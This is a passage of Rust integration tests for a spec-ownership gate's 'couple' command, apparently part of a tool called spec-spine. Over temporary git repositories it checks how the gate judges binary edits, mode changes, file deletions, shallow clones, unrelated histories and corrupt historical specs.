    fs::write(root.join("crate-a/assets/logo.png"), BINARY_B).unwrap();
    commit_all(root, "binary edit", &[]);

    let v = couple_git_json(root);
    assert_eq!(v["exitCode"], 1, "{v}");
    assert_eq!(violation_codes(&v), vec!["C-001"], "{v}");
    let violation = &v["report"]["violations"][0];
    assert_eq!(violation["path"], "crate-a/assets/logo.png", "{v}");
    assert_eq!(violation["owners"][0], "001-a", "{v}");
}

/// §3.7 case 3: a binary delete is judged as a deletion. The path is seen
/// (`checkedPaths` counts it, which pre-092 it did not), and the ownership
/// ratchet leaves a file that is gone alone: an unclaimed source file whose
/// bytes are binary would otherwise be `C-002`.
#[test]
fn binary_delete_is_seen_and_is_not_an_ownership_refusal() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    fs::write(root.join("crate-a/src/blob.rs"), BINARY_A).unwrap();
    git_in(root, &["init", "-q"]);
    commit_all(root, "base", &[]);

    fs::remove_file(root.join("crate-a/src/blob.rs")).unwrap();
    commit_all(root, "binary delete", &[]);

    let v = couple_git_json(root);
    assert_eq!(v["exitCode"], 0, "{v}");
    assert!(violation_codes(&v).is_empty(), "{v}");
    assert_eq!(v["report"]["checkedPaths"], 1, "the delete was judged: {v}");

    // The control: the same unclaimed binary *added* is a live source file and
    // the ratchet refuses it, so the pass above is the deletion verdict and not
    // a universe the file was never in.
    fs::write(root.join("crate-a/src/blob.rs"), BINARY_B).unwrap();
    commit_all(root, "binary add", &[]);
    let v = couple_git_json(root);
    assert_eq!(v["exitCode"], 1, "{v}");
    assert_eq!(violation_codes(&v), vec!["C-002"], "{v}");
}

/// §3.7 case 4: a mode flip with its owning `spec.md` in the same diff clears.
#[test]
fn mode_only_change_with_its_owning_spec_clears() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    git_in(root, &["init", "-q"]);
    commit_all(root, "base", &[]);

    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/lib.rs\"\n---\n# 001-a\n## body\n\
         lib.rs is executable now.\n",
    );
    commit_all(root, "chmod with spec", &["crate-a/src/lib.rs"]);

    let v = couple_git_json(root);
    assert_eq!(v["exitCode"], 0, "{v}");
    assert!(violation_codes(&v).is_empty(), "{v}");
    assert_eq!(v["report"]["checkedPaths"], 2, "lib.rs and spec.md: {v}");
}

/// §3.7 case 5, the half the binary can show: a path git reports through both
/// sources (a text edit made together with a mode flip) is one entry, judged
/// once. A union that appended instead of merging would count it twice and
/// raise its `C-001` twice. That the entry keeps its parsed spans is asserted
/// against the diff adapter itself, over a real repository, in
/// `cmd_couple.rs`'s `real_git_text_change_keeps_spans_through_the_union`: no
/// verdict the binary emits depends on spans for an index-resolved unit, because
/// the indexer seeds a whole-file implementing path for every owning unit's
/// file (073 D-3).
#[test]
fn text_and_mode_change_to_one_path_is_judged_once() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_ratchet(root);
    git_in(root, &["init", "-q"]);
    commit_all(root, "base", &[]);

    write(root, "crate-a/src/lib.rs", "pub fn a() {}\npub fn b() {}\n");
    commit_all(root, "edit and chmod", &["crate-a/src/lib.rs"]);

    let v = couple_git_json(root);
    assert_eq!(v["exitCode"], 1, "{v}");
    assert_eq!(v["report"]["checkedPaths"], 1, "one path, once: {v}");
    assert_eq!(violation_codes(&v), vec!["C-001"], "{v}");
}

// ===== spec 100: a deleted path is judged where it lived =====
//
// End-to-end over real git repositories, because the thing under test is the
// reconstruction of a historical snapshot and its failure modes. Each case
// asserts an exit code and, where it matters, the message; none of them
// searches the source for a token.

/// A governed repo where `001-a` claims two files inside a crate whose
/// manifest floor is `002-floor`.
fn setup_deletion(root: &Path) {
    write(root, "Cargo.toml", "[workspace]\nmembers = [\"crate-a\"]\n");
    write(
        root,
        "crate-a/Cargo.toml",
        "[package]\nname = \"crate-a\"\nversion = \"0.1.0\"\n\
         [package.metadata.spec-spine]\nspec = \"002-floor\"\n",
    );
    write(root, "crate-a/src/doomed.rs", "pub fn doomed() {}\n");
    write(root, "crate-a/src/kept.rs", "pub fn kept() {}\n");
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/doomed.rs\"\n  \
         - \"crate-a/src/kept.rs\"\n---\n# 001-a\n## body\n",
    );
    write(
        root,
        "specs/002-floor/spec.md",
        "---\nid: \"002-floor\"\ntitle: \"Floor\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\n---\n# 002-floor\n## body\n",
    );
}

/// `001-a` without its claim on `doomed.rs`: the withdrawal.
fn withdraw_claim(root: &Path) {
    write(
        root,
        "specs/001-a/spec.md",
        "---\nid: \"001-a\"\ntitle: \"A\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\nestablishes:\n  - \"crate-a/src/kept.rs\"\n---\n# 001-a\n## body\n",
    );
}

fn couple_range(root: &Path, extra: &[&str]) -> std::process::Output {
    let mut cmd = bin();
    cmd.arg("--repo")
        .arg(root)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"]);
    cmd.args(extra);
    cmd.output().unwrap()
}

#[test]
fn committed_deletion_is_judged_at_the_merge_base() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // The whole correct removal, in one commit: the file goes, and its claim
    // is withdrawn in the owning spec's own frontmatter.
    fs::remove_file(root.join("crate-a/src/doomed.rs")).unwrap();
    withdraw_claim(root);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "remove doomed"]);

    let out = couple_range(root, &[]);
    assert_eq!(
        code(&out),
        0,
        "a withdrawn claim must clear its own removal.\nstdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
}

#[test]
fn committed_deletion_without_withdrawal_still_refuses() {
    // The legitimate refusal that must survive: the file goes and nobody
    // authors the removal in the spec that owned it.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // A file inside the crate that no spec specifically claims: the manifest
    // floor `002-floor` is its only owner, at the merge base and at head
    // alike. Removing it without an authoring edit must still refuse, and the
    // index stays clean because no unit claim is left dangling.
    write(root, "crate-a/src/floor_only.rs", "pub fn f() {}\n");
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "add a floor-only file"]);
    fs::remove_file(root.join("crate-a/src/floor_only.rs")).unwrap();
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "remove without withdrawing"]);

    let out = couple_range(root, &[]);
    assert_eq!(code(&out), 1, "{}", String::from_utf8_lossy(&out.stderr));
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(
        err.contains("002-floor"),
        "must name the prior owner: {err}"
    );
}

#[test]
fn worktree_deletion_is_judged_at_head_commit() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    // A second commit so `HEAD~1` exists and the committed range is empty.
    write(root, "notes.md", "n\n");
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "second"]);

    // The removal exists only in the working tree, staged.
    fs::remove_file(root.join("crate-a/src/doomed.rs")).unwrap();
    withdraw_claim(root);
    refresh(root);
    git_in(root, &["add", "-A"]);

    let out = couple_range(root, &["--include-uncommitted"]);
    assert_eq!(
        code(&out),
        0,
        "a working-tree withdrawal must clear its own removal.\nstdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
}

#[test]
fn add_then_delete_is_judged_at_head_commit() {
    // The case a single merge-base snapshot gets wrong. The file does not
    // exist at the merge base at all, so a base-only design finds no owner and
    // silently passes. Its claim is standing at HEAD, so the withdrawal is
    // obligatory and its absence must refuse.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // Commit a NEW file after the merge base. It is owned by the crate's
    // manifest floor, which is ownership the merge base knows nothing about
    // because the path did not exist there.
    write(root, "crate-a/src/fresh.rs", "pub fn fresh() {}\n");
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "add fresh"]);

    // Delete it in the working tree, editing no spec. A base-only design
    // would find the path absent at the merge base, conclude nobody owned it,
    // and pass. Judged at HEAD it has an owner, so it must refuse.
    fs::remove_file(root.join("crate-a/src/fresh.rs")).unwrap();
    git_in(root, &["add", "-A"]);
    let refused = couple_range(root, &["--include-uncommitted", "--json"]);
    assert_eq!(
        code(&refused),
        1,
        "the ownership standing at HEAD must be authored.\nstdout: {}\nstderr: {}",
        String::from_utf8_lossy(&refused.stdout),
        String::from_utf8_lossy(&refused.stderr)
    );
    let json: serde_json::Value =
        serde_json::from_slice(&refused.stdout).expect("verdict envelope");
    let d = json["report"]["deletions"]
        .as_array()
        .expect("deletion provenance")
        .iter()
        .find(|e| e["path"] == "crate-a/src/fresh.rs")
        .expect("the fresh path");
    assert_eq!(d["snapshot"], "head-commit", "{json}");
    assert!(
        json["report"]["violations"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v["owners"]
                .as_array()
                .is_some_and(|o| o.iter().any(|x| x == "002-floor"))),
        "must name the HEAD owner: {json}"
    );

    // Authoring the removal in the owning spec clears it.
    write(
        root,
        "specs/002-floor/spec.md",
        "---\nid: \"002-floor\"\ntitle: \"Floor\"\nstatus: approved\ncreated: \"2026-06-09\"\n\
         summary: \"s\"\n---\n# 002-floor\n## body\n\n`fresh.rs` was removed.\n",
    );
    refresh(root);
    git_in(root, &["add", "-A"]);
    let cleared = couple_range(root, &["--include-uncommitted"]);
    assert_eq!(
        code(&cleared),
        0,
        "stdout: {}\nstderr: {}",
        String::from_utf8_lossy(&cleared.stdout),
        String::from_utf8_lossy(&cleared.stderr)
    );
}

#[test]
fn delete_then_restore_is_not_a_deletion() {
    // The union takes the later view (spec 081), so a path removed in the
    // committed range and restored in the working tree is an addition at head
    // and engages no prior snapshot.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    fs::remove_file(root.join("crate-a/src/doomed.rs")).unwrap();
    withdraw_claim(root);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "remove"]);

    // Restore it, and re-add the claim, in the working tree.
    write(root, "crate-a/src/doomed.rs", "pub fn doomed() {}\n");
    setup_deletion(root); // rewrites 001-a with both claims
    refresh(root);
    git_in(root, &["add", "-A"]);

    let out = couple_range(root, &["--include-uncommitted", "--json"]);
    assert_eq!(
        code(&out),
        0,
        "stdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    let json: serde_json::Value = serde_json::from_slice(&out.stdout).expect("verdict envelope");
    let deletions = json["report"]["deletions"].as_array();
    assert!(
        deletions.is_none_or(|d| d.iter().all(|e| e["path"] != "crate-a/src/doomed.rs")),
        "a restored path is not a deletion: {json}"
    );
}

#[test]
fn shallow_clone_is_not_treated_as_an_empty_diff() {
    // Spec 100 §3.5, the "do not treat a shallow clone as an empty diff" rule.
    //
    // In a `--depth 1` clone the three-dot range cannot be resolved at all, so
    // `git diff` fails before the snapshot logic is reached. That is still an
    // explicit non-success at exit 3, which is what the rule requires: what
    // must never happen is exit 0 with nothing examined. The tailored
    // "could not obtain the snapshot" message belongs to the states where the
    // diff succeeds and the merge base does not, which
    // `unrelated_histories_refuse_exit_3` covers (D-5).
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    fs::remove_file(root.join("crate-a/src/doomed.rs")).unwrap();
    withdraw_claim(root);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "remove"]);

    // A depth-1 clone holds the deletion commit and nothing before it, so
    // there is no merge base to reconstruct.
    let shallow = tempfile::tempdir().unwrap();
    let clone = Command::new("git")
        .args(["clone", "-q", "--depth", "1", "--no-local"])
        .arg(format!("file://{}", root.display()))
        .arg(shallow.path().join("c"))
        .output()
        .unwrap();
    assert!(
        clone.status.success(),
        "clone: {}",
        String::from_utf8_lossy(&clone.stderr)
    );
    let c = shallow.path().join("c");

    let out = bin()
        .arg("--repo")
        .arg(&c)
        .args(["couple", "--base", "HEAD~1", "--head", "HEAD"])
        .output()
        .unwrap();
    assert_eq!(
        code(&out),
        3,
        "stdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        !String::from_utf8_lossy(&out.stdout).contains("no drift"),
        "a run that could not read the history must not report a pass"
    );
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(
        err.contains("has not judged") && err.contains("fetch"),
        "the refusal must say it judged nothing, and name the remedy: {err}"
    );
}

#[test]
fn unrelated_histories_refuse_exit_3() {
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q", "-b", "trunk"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);

    // An unrelated root commit, made with plumbing so the working tree is
    // never touched: `checkout --orphan` would have to clobber the fixture.
    let git_out = |args: &[&str]| -> String {
        let out = Command::new("git")
            .arg("-C")
            .arg(root)
            .args(args)
            .env("GIT_AUTHOR_NAME", "t")
            .env("GIT_AUTHOR_EMAIL", "t@t")
            .env("GIT_COMMITTER_NAME", "t")
            .env("GIT_COMMITTER_EMAIL", "t@t")
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git {args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8_lossy(&out.stdout).trim().to_string()
    };
    let empty_tree = git_out(&["hash-object", "-t", "tree", "/dev/null"]);
    let orphan = git_out(&["commit-tree", &empty_tree, "-m", "orphan"]);
    git_in(root, &["branch", "other", &orphan]);

    fs::remove_file(root.join("crate-a/src/doomed.rs")).unwrap();
    withdraw_claim(root);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "remove"]);

    let out = bin()
        .arg("--repo")
        .arg(root)
        .args(["couple", "--base", "other", "--head", "HEAD"])
        .output()
        .unwrap();
    assert_eq!(
        code(&out),
        3,
        "stdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(
        err.contains("has not judged"),
        "the refusal must say it did not judge: {err}"
    );
    assert!(
        err.contains("fetch"),
        "the refusal must name the operator remedy: {err}"
    );
}

#[test]
fn corrupt_prior_corpus_refuses_exit_3() {
    // Spec 100 §3.5: a snapshot whose corpus does not compile has not
    // answered. It is not empty, and the gate must not pass on it.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    // The BASE commit carries a spec whose frontmatter does not parse.
    write(
        root,
        "specs/003-broken/spec.md",
        "---\nid: \"003-broken\"\ntitle: [this is not a string\n---\n# broken\n",
    );
    git_in(root, &["init", "-q"]);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base with a broken spec"]);

    // Head repairs the corpus, removes the file and withdraws the claim, so
    // the head tree is fine and only the historical snapshot is unreadable.
    fs::remove_file(root.join("specs/003-broken/spec.md")).unwrap();
    fs::remove_file(root.join("crate-a/src/doomed.rs")).unwrap();
    withdraw_claim(root);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "repair and remove"]);

    let out = couple_range(root, &[]);
    assert_eq!(
        code(&out),
        3,
        "stdout: {}\nstderr: {}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    );
    let err = String::from_utf8_lossy(&out.stderr);
    assert!(
        err.contains("could not be compiled"),
        "the refusal must name corrupt historical evidence: {err}"
    );
}

#[test]
fn no_deletion_builds_no_prior_snapshot() {
    // Spec 100 §3.4: a deletion-free change asks no question a prior snapshot
    // could answer, so a shallow clone that cannot reach the merge base still
    // produces a verdict. This is the assertion that keeps §3.5's refusal from
    // reaching every pull request.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    git_in(root, &["init", "-q"]);
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "base"]);
    write(
        root,
        "crate-a/src/kept.rs",
        "pub fn kept() {}\npub fn two() {}\n",
    );
    refresh(root);
    git_in(root, &["add", "-A"]);
    git_in(root, &["commit", "-q", "-m", "modify"]);

    let shallow = tempfile::tempdir().unwrap();
    let clone = Command::new("git")
        .args(["clone", "-q", "--depth", "1", "--no-local"])
        .arg(format!("file://{}", root.display()))
        .arg(shallow.path().join("c"))
        .output()
        .unwrap();
    assert!(clone.status.success());
    let c = shallow.path().join("c");

    // The change under test has to be a real one, or the assertion is vacuous:
    // `--base HEAD --head HEAD` alone is an empty range, and a run that
    // examines nothing trivially needs no snapshot. The working-tree segment
    // carries a deletion-free modification instead, which the shallow clone
    // can express without reaching any commit it does not have.
    fs::write(
        c.join("crate-a/src/kept.rs"),
        "pub fn kept() {}\npub fn three() {}\n",
    )
    .unwrap();
    let out = bin()
        .arg("--repo")
        .arg(&c)
        .args([
            "couple",
            "--base",
            "HEAD",
            "--head",
            "HEAD",
            "--include-uncommitted",
        ])
        .output()
        .unwrap();
    let err = String::from_utf8_lossy(&out.stderr);
    assert_ne!(
        code(&out),
        3,
        "a deletion-free run must not need history.\nstdout: {}\nstderr: {err}",
        String::from_utf8_lossy(&out.stdout)
    );
    // And it reached a verdict ABOUT the modification, not about nothing: the
    // edited file is claimed by 001-a, whose spec.md is untouched, so the
    // ordinary refusal is the proof the path was examined at all.
    assert_eq!(
        code(&out),
        1,
        "the modification must be judged at head.\nstdout: {}\nstderr: {err}",
        String::from_utf8_lossy(&out.stdout)
    );
    assert!(
        err.contains("C-001") && err.contains("crate-a/src/kept.rs"),
        "the verdict must name the modified path: {err}"
    );
}

#[test]
fn paths_from_builds_no_prior_snapshot() {
    // Spec 100 §3.9: `--paths-from` carries no history, sets no deletion, and
    // must engage no snapshot even in a repository with no git history at all.
    let tmp = tempfile::tempdir().unwrap();
    let root = tmp.path();
    setup_deletion(root);
    refresh(root);
    let out = couple_paths(root, &["crate-a/src/doomed.rs"], &[]);
    assert_eq!(
        code(&out),
        1,
        "judged at head as an edit, with no history present: {}",
        String::from_utf8_lossy(&out.stderr)
    );
}
